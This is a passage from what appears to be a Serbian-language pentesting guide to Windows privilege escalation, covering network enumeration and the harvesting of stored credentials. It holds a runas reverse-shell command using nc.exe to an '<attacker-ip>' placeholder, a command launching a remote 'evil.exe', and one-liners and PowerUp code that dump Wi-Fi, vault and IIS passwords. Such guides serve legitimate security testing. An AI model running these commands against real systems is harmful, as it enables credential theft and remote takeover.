
### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts fajl

Proverite da li su u hosts fajlu hardkodirani podaci o drugim poznatim računarima.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite da li su ograničene usluge dostupne spolja.

```bash
netstat -ano #Opened ports?
```

Za lokalni listener, utvrdite PID procesa, vlasnika procesa, putanju izvršne datoteke i servis ili zakazani zadatak koji ga pokreće. Servis za daljinsko upravljanje može omogućiti pristup kao njegov desktop korisnik samo ako to dozvoljavaju njegova autentifikacija i kontrole komandi. Prilagođena TCP aplikacija koja radi pod nalogom sa višim privilegijama zaseban je cilj za proveru: listener i putanja binarne datoteke pasivni su tragovi, dok putanja za korupciju memorije koja zahteva autentifikaciju zahteva analizu te konkretne binarne datoteke i ulaza koji joj je dostupan. Ako izgleda da izloženi port pripada sistemskom procesu, uporedite ga sa [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) pre nego što pripišete vezu pozadinskom servisu; samo pravilo za prosleđivanje ne dokazuje da je odredište dostupno ili ranjivo.

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Firewall pravila

[**Pogledajte ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(prikaži pravila, kreiraj pravila, isključi, isključi...)**

Više [komandi za network enumeration pronađite ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarna datoteka `bash.exe` može se pronaći i u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kom portu (prvi put kada upotrebite `nc.exe` za osluškivanje na portu, GUI će vas pitati da li `nc` treba da bude dozvoljen kroz firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete da probate `--default-user root`

Možete da istražite WSL sistem datoteka u fascikli `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Linux `root` unutar WSL-a sam po sebi ne daje administratorska prava u Windows-u. Ako trenutni Windows identitet može da čita sistem datoteka neke distribucije, pregledajte datoteke istorije shell-a (uključujući `/root/.bash_history`) u potrazi za komandama koje su možda zabeležile akreditive; za eskalaciju su i dalje potrebni važeći nalog sa višim privilegijama i dozvoljen način autentifikacije. Raspored `LocalState\rootfs` važi za starije instalacije WSL-a; WSL 2 obično čuva distribuciju na [virtuelnom disku `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), zato prvo utvrdite stvarnu distribuciju i putanju skladišta. Izbegavajte ispisivanje sadržaja istorije tokom automatizovanog popisivanja.

## Windows akreditivi

### Winlogon akreditivi

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Tretirajte `DefaultUserName` i `DefaultDomainName` kao kontekst naloga, a ne kao akreditive. Neprazna vrednost `DefaultPassword` ili `AltDefaultPassword` predstavlja nalaz plaintext lozinke u registru. Ako je `AutoAdminLogon=1`, ali plaintext lozinka nije čitljiva, to je samo trag: [Sysinternals Autologon može da čuva lozinku kao LSA tajnu](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), a uobičajeno čitanje registra ne potvrđuje da li ta tajna postoji niti da li se može preuzeti. Proverite prava pristupa i stvarnu konfiguraciju prijavljivanja pre nego što prijavite izložene akreditive.

### Credential Manager / Windows vault

Preuzeto sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault čuva korisničke akreditive za servere, veb-sajtove i druge programe koje **Windows** može da koristi za **automatsko prijavljivanje korisnika**. Na prvi pogled, moglo bi delovati da korisnici mogu da sačuvaju akreditive za sajtove kao što su Facebook, Twitter ili Gmail i da se pregledači automatski prijavljuju, ali to ne funkcioniše tako.

Windows Vault čuva akreditive koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da **svaka Windows aplikacija kojoj su potrebni akreditivi za pristup resursu** (serveru ili veb-sajtu) **može da koristi ovaj Credential Manager** i Windows Vault i da koristi sačuvane akreditive, umesto da korisnici svaki put unose korisničko ime i lozinku.

Osim ako aplikacije ne komuniciraju sa Credential Manager-om, mislim da ne mogu da koriste akreditive za određeni resurs. Dakle, ako vaša aplikacija želi da koristi vault, trebalo bi nekako da **komunicira sa Credential Manager-om i zatraži akreditive za taj resurs** iz podrazumevanog skladišta vault-a.

Koristite `cmdkey` da biste izlistali sačuvane akreditive na računaru.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijom `/savecred` da biste koristili sačuvane akreditive. Sledeći primer poziva udaljeni binarni fajl preko SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa zadatim akreditivima.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Imajte na umu da mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ili modul Powershells iz [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Moderne Windows UWP aplikacije, Microsoft Edge i moderne sistemske usluge čuvaju tokene za autentifikaciju i lozinke u otvorenom tekstu unutar UWP `PasswordVault` skladišta (koje je u `vaultcmd` dostupno i kao `Web Credentials`). Ovo skladište je izolovano po sesijama i može se dešifrovati nativno, bez administratorskih prava ili prava `SeDebugPrivilege`.

Pokrenite ovu PowerShell komandu u aktivnoj sesiji korisnika da biste odmah izlistali i dešifrovali sva sačuvana korisnička imena i lozinke u otvorenom tekstu:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)** pruža metod za simetrično šifrovanje podataka, koji se pretežno koristi u operativnom sistemu Windows za simetrično šifrovanje asimetričnih privatnih ključeva. Ovo šifrovanje koristi korisničku ili sistemsku tajnu kako bi značajno doprinelo entropiji.

**DPAPI omogućava šifrovanje ključeva pomoću simetričnog ključa izvedenog iz korisničkih tajni za prijavljivanje**. U slučajevima kada se koristi sistemsko šifrovanje, upotrebljavaju se sistemske tajne za domen autentifikaciju.

Šifrovani korisnički RSA ključevi zaštićeni pomoću DPAPI-ja čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja korisnikov [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **DPAPI ključ, koji se nalazi uz glavni ključ koji štiti korisnikove privatne ključeve u istoj datoteci**, obično se sastoji od 64 bajta nasumičnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, pa njegov sadržaj nije moguće prikazati komandom `dir` u CMD-u, ali može da se prikaže u PowerShell-u.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste ga dešifrovali.

**Datoteke sa akreditivima zaštićene glavnom lozinkom** obično se nalaze u:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete da koristite **mimikatz module** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete da **izvučete mnoge DPAPI** **masterkeys** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako imate root pristup).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell akreditivi

**PowerShell akreditivi** se često koriste za **skriptovanje** i zadatke automatizacije kao praktičan način čuvanja šifrovanih akreditiva. Zaštićeni su pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Izvezeni akreditiv može imati proizvoljan naziv datoteke ili `.xml` putanju. Kada skripta ili inventar datoteka ukaže na njega, utvrdite stvarnu putanju direktorijuma profila naloga umesto da pretpostavite da je `C:\Users`: [Windows može da smesti profile i na drugim lokacijama](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Čitljiva datoteka samo je naznaka; [`Export-Clixml` u Windowsu povezuje šifrovani akreditiv sa korisnikom i računarom koji su ga izvezli](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), a za svaki pronađeni nalog treba zasebno proveriti da li ima važeća ovlašćenja za željenu uslugu. Najpre pregledajte putanje i ACL-ove, bez ispisivanja šifrovanih ili otvorenih vrednosti tokom rutinskog popisivanja.

Da biste **dešifrovali** PS akreditive iz datoteke koja ih sadrži, možete da uradite sledeće:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP veze

Možete ih pronaći u `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Nedavno pokrenute komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Menadžer akreditiva za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite modul Mimikatz `dpapi::rdg` sa odgovarajućim `/masterkey` da **dešifrujete sve .rdg datoteke**\
Možete **izvući mnogo DPAPI masterkey ključeva** iz memorije pomoću modula Mimikatz `sekurlsa::dpapi`

**mRemoteNG koristi drugačije skladište veza.** Pregledajte čitljive XML datoteke u `%APPDATA%\mRemoteNG` i korisničkim fasciklama Documents, uključujući datoteke sa uobičajenim nazivima kao što je `config.xml`. Identifikujte šemu veza i šifrovane atribute `Password` pre nego što XML datoteku tretirate kao naznaku mogućih akreditiva. Sačuvana vrednost nije DPAPI/RDCMan lozinka; oporavak zavisi od postavki šifrovanja datoteke i od toga da li je korišćena prilagođena glavna lozinka. Izbegavajte ispisivanje šifrovanih vrednosti tokom opsežne enumeracije.

**Izvozi profila Remote Desktop Plus** takođe mogu biti čitljivi u korisničkim fasciklama ili deljenoj administrativnoj fascikli. Izvoz `profiles.xml` iz starije verzije sadrži unose `Data/Profile` sa elementima `ProfileName`, `Password` i `Secure`. Tretirajte neprazan element lozinke kao naznaku mogućih akreditiva, bez ispisivanja njegove vrednosti i bez pretpostavke da je tekst u otvorenom obliku: [proizvođač navodi](https://www.donkz.nl/) da zaštita profila može biti vezana za nalog i računar na kojima je profil kreiran ili podešena tako da bude manje stroga. Proverite poreklo datoteke i uslove oporavka pre nego što se oslonite na nju.

### Sticky Notes

Ljudi ponekad čuvaju lozinke i druge informacije u aplikacijama za lepljive beleške. Microsoftova upakovana aplikacija Sticky Notes obično čuva beleške na lokaciji `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; starije ili drugačije aplikacije mogu koristiti druga korisnička skladišta profila, uključujući LevelDB. Utvrdite koja je aplikacija instalirana i koji format skladištenja koristi pre nego što nepostojanje SQLite datoteke protumačite kao odsustvo beleški.

Ako Sticky Notes koristi SQLite zapisivanje unapred (WAL), sama kopija datoteke `plum.sqlite` može izostaviti nedavno potvrđene beleške. Sačuvajte odgovarajuću datoteku `plum.sqlite-wal` uz konzistentnu kopiju baze podataka, kao i `plum.sqlite-shm` ako je dostupna; indeks deljene memorije može ponovo da se izgradi, ali WAL je deo trajnog stanja baze podataka. Pogledajte [SQLite WAL dokumentaciju](https://www.sqlite.org/wal.html). Beleška koja sadrži ime naloga ili lozinku samo je naznaka mogućih akreditiva: zasebno proverite nalog, dozvoljeni pristup i ponovnu upotrebu lozinke. Zapis iz šifrovanog upravljača lozinkama dodatno zahteva odgovarajući ključ za dešifrovanje i tumačenje specifično za aplikaciju da bi mogao da potvrdi prijavu sa višim privilegijama.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti alat na nivou visokog integriteta.**\
**AppCmd.exe** se nalazi u fascikli `%systemroot%\system32\inetsrv\`.\
Ako ova datoteka postoji, moguće je da su konfigurisani neki **akreditivi** koji se mogu **oporaviti**.

Ovaj kod je preuzet iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proveri da li `C:\Windows\CCM\SCClient.exe` postoji .\
Instalateri se **pokreću sa SYSTEM privilegijama**, mnogi su ranjivi na **DLL Sideloading (informacije iz** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Datoteke i Registry (kredencijali)

### Artefakti kredencijala u Registry ključevima alata za podršku

Neke starije instalacije alata za udaljenu podršku zadržavaju nazive vrednosti povezane s lozinkama u fiksnim ključevima aplikacije u Registry-ju. Na primer, prema [objašnjenju proizvođača o Registry ključu](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988), `SecurityPasswordAES` u verzijama TeamViewer-a pre verzije 9 označavao je konfigurisanu statičku lozinku sesije. Marker u nazivu vrednosti samo je trag za proveru: pre procene tog kredencijala proverite instaliranu verziju, da li se podaci vrednosti mogu pročitati, njihov format i trenutno ponašanje pri autentifikaciji. Prelazak sa lozinke za udaljenu podršku na privilegovaniji Windows nalog zahteva i stvarnu ponovnu upotrebu lozinke, kao i ovlašćenje za taj nalog. Izbegavajte da šifrovani tekst ili pronađene lozinke budu deo uobičajenog izlaza enumeracije.

### Deljene tabele sa zaštićenim listovima

Ako se sumnja da deljena radna sveska koja se može pročitati sadrži podatke o nalozima, razlikujte **šifrovanje datoteke** od zaštite radnog lista ili skrivenih kolona. [Microsoft navodi](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) da zaštita radnog lista ograničava uređivanje, ali nije bezbednosna funkcija; ona sama po sebi ne znači da je sadržaj radne sveske šifrovan. Pregledajte samo ovlašćene i relevantne datoteke i izbegavajte ispisivanje mogućih tajni tokom široke enumeracije. Putanja do čitljive `.xlsx` datoteke, zaštićen list ili skrivena kolona sami po sebi ne dokazuju da postoje kredencijali niti da neki nalog ima veće privilegije; zasebno proverite stvarne podatke i trenutna prava naloga.

### Zadržane zakrpe izmena CI servera

CI server može zadržati poslate izmene izvornog koda u svom direktorijumu podataka i nakon završetka izgradnje. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` kao lokaciju za izmene udaljenih pokretanja; direktorijum podataka može biti prilagođen i ne mora se nalaziti u `ProgramData`. Čitljiva zakrpa može sačuvati uklonjene ili dodate reference na datoteku sa kredencijalima, ključ za šifrovanje ili skriptu koja koristi oboje. Na primer, tok rada PowerShell komande `ConvertTo-SecureString -Key` zahteva AES ključ, kao i šifrovani niz; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) da se ključ prosleđuje zasebno. Najpre pregledajte samo dostupne nazive zakrpa, a zatim, uz ovlašćenje, proverite relevantan sadržaj bez ispisivanja tajni u uobičajenom izlazu enumeracije. Putanja do zakrpe, šifrovana vrednost ili referenca na ključ sami po sebi ne dokazuju da su kredencijali važeći niti da omogućavaju pristup sa većim privilegijama. Ograničite ACL-ove direktorijuma podataka i izbegavajte unošenje tajni u izmene izgradnje.

### Prilagođeno menjanje lozinki lokalnog administratora

Interni alat za promenu lozinki može čuvati šifrovanu lozinku lokalnog administratora u lokalnoj usluzi, a kredencijale za skladište podataka u čitljivoj `.env` datoteci ili pored binarne datoteke programa za ažuriranje. Zajedno proverite zakazani zadatak programa za ažuriranje, nalog, ACL-ove konfiguracije, listener i dozvole za skladište podataka. Skladištu podataka dostupnom samo preko loopback-a i dalje može pristupiti lokalni korisnik koji ima važeće kredencijale, ali sama autentifikacija ne dokazuje da korisnik ima dozvolu za čitanje relevantnih zapisa. Ako su seme za šifrovanje ili materijal ključa dostupni pored šifrovanog teksta, pre oslanjanja na šifrovanje proverite tačan način izvođenja ključa. Šema koja deterministički izvodi AES ključ iz otkrivenog semena pomoću Go paketa [`math/rand`](https://pkg.go.dev/math/rand) nije prikladna za zaštitu te lozinke; Go navodi da taj paket nije namenjen slučajnim vrednostima osetljivim sa bezbednosnog stanovišta. Pre nego što bilo koju pronađenu lozinku tretirate kao put za eskalaciju, potvrdite da je i dalje važeća i da pripada nalogu iz lokalne grupe Administrators. Zakazani zadatak, putanja do `.env` datoteke ili šifrovani blok sami po sebi ne dokazuju nijedan od tih uslova. Izbegavajte da lozinke i materijal ključa budu deo uobičajenog izlaza enumeracije.

Za upravljanje lozinkama lokalnih administratora koristite [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Njegovo skladištenje u direktorijumu ili sistemu Entra i povezane kontrole pristupa razlikuju se od prilagođenog lokalnog skladišta podataka; [uloge u Elasticsearch-u](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) takođe određuju da li autentifikovani korisnik skladišta podataka može da čita određeni indeks.

### Arhive dodataka Java servera i ponovna upotreba kredencijala

Neki dodaci za Java servere distribuiraju se kao JAR arhive u direktorijumu `plugins` servera. Čitljiv prilagođeni dodatak može sadržati konfiguraciju ili bajtkod sa ugrađenim kredencijalom usluge. Arhivu pregledajte samo uz ovlašćenje, a pronađene tajne izostavite iz uobičajenog izlaza enumeracije. Sama putanja do dodatka ne dokazuje da tajna postoji, a pronađena lozinka usluge vodi do većih privilegija samo ako važi i za privilegovaniji nalog. Proverite relevantne ACL-ove datoteka i zamenite ponovo upotrebljene kredencijale zasebnim tajnama. Pogledajte [PaperMC vodič za instalaciju dodataka](https://docs.papermc.io/paper/adding-plugins/) za raspored direktorijuma i [Oracle dokumentaciju za JAR](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) za sadržaj arhive.

### Kredencijali ugrađene baze podataka Openfire-a

Instalacija Openfire-a koja koristi ugrađenu bazu podataka može čuvati `openfire.script` u direktorijumu `Openfire\embedded-db`. Ako trenutni nalog može da ga pročita, zajedno proverite zapise `OFUSER` i svojstvo `passwordKey`. Openfire [dokumentacija za provajdere korisnika](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) navodi da lozinke mogu biti sačuvane kao običan tekst ili šifrovane ključem koji se nalazi u tom svojstvu. Pronađena lozinka važna je za eskalaciju samo ako je i dalje važeća za identitet sa većim privilegijama; samo ime datoteke ne dokazuje ni pristup za čitanje ni ponovnu upotrebu kredencijala. Putanja je samo smernica za inventarisanje, zato izostavite sadržaj baze podataka i kredencijale iz uobičajenog izlaza enumeracije.

Zasebna datoteka `Openfire\conf\openfire.xml` može otkriti konfigurisane portove i interfejs za vezivanje administratorske konzole, čak i kada se koristi spoljna baza podataka. Openfire obično vezuje administratorsku konzolu za loopback; lokalni nalog ipak može da pristupi toj adresi ako listener radi. Zajedno proverite stvarni listener, ovlašćenu administratorsku ulogu, pravila za otpremanje dodataka i identitet Openfire usluge. Administrator koji može da instalira dodatak može izazvati izvršavanje njegovog koda u kontekstu usluge, što može imati visoke privilegije ako se usluga pokreće kao LocalSystem. Podudaranje lozinke naloga ili čitljiva putanja do konfiguracije sami po sebi ne dokazuju pristup administratorskoj konzoli ni izvršavanje koda. Pogledajte proizvođačev [vodič za instalaciju i upravljanje dodacima](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) i [svojstvo API-ja za otpremanje dodataka](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracija servera za forenzičko upravljanje

Konfiguracije servera Velociraptor, najčešće nazvane `server.config.yaml`, mogu sadržati `CA.private_key` interne CA. Ako korisnik sa manjim privilegijama može da pročita taj ključ, možda će moći da izda API klijentski sertifikat. Da li to vodi do većih privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se pokreće server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup serverskoj CA. Neke instalacije drže privatni ključ CA van mreže, pa čitljiva serverska konfiguracija možda uopšte ne sadrži ključ za potpisivanje.

Na Windows serveru proverite ACL konfiguracione datoteke **servera** u instalacionom direktorijumu i svih zaštićenih rezervnih kopija. Moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se putanja razlikuje, koristite putanju konfigurisanu za uslugu. Potvrdite da trenutni identitet može da pročita datoteku i da je `CA.private_key` zaista prisutan. Ne ispisujte privatni ključ u evidencijama ili izlazu enumeracije. Proizvođačev tok rada `config api_client` koristi ključ CA za izdavanje klijentskog sertifikata, ali je potrebna i odgovarajuća uloga na serveru; njeno kreiranje ili menjanje može zahtevati upis u skladište podataka ili ponovno pokretanje. Postojeći privilegovani identitet servera može predstavljati put do pristupa čak i kada takav upis nije moguć. API upiti sa pravima izvršavanja pokreću se u kontekstu odgovarajućeg servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA van mreže kad god je to moguće i ograničite API uloge i pristup listeneru. Pogledajte [dokumentaciju Velociraptor API-ja](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY kredencijali

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegova izvorna šifrovana baza može biti na lokaciji `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok izvezena rezervna kopija sesija može imati naziv `sessions-backup.dat` i biti sačuvana na drugoj lokaciji. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i mogu sadržati sesije, ključeve, skripte, oznake i veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvorne baze. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hosta

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, pa proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo kakav unos u toj putanji, verovatno je u pitanju sačuvani SSH ključ. Čuva se šifrovano, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta, a želite da se automatski pokreće prilikom podizanja sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije validna. Pokušao sam da napravim SSH ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu preko SSH-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije otkrio korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za automatizovanu instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

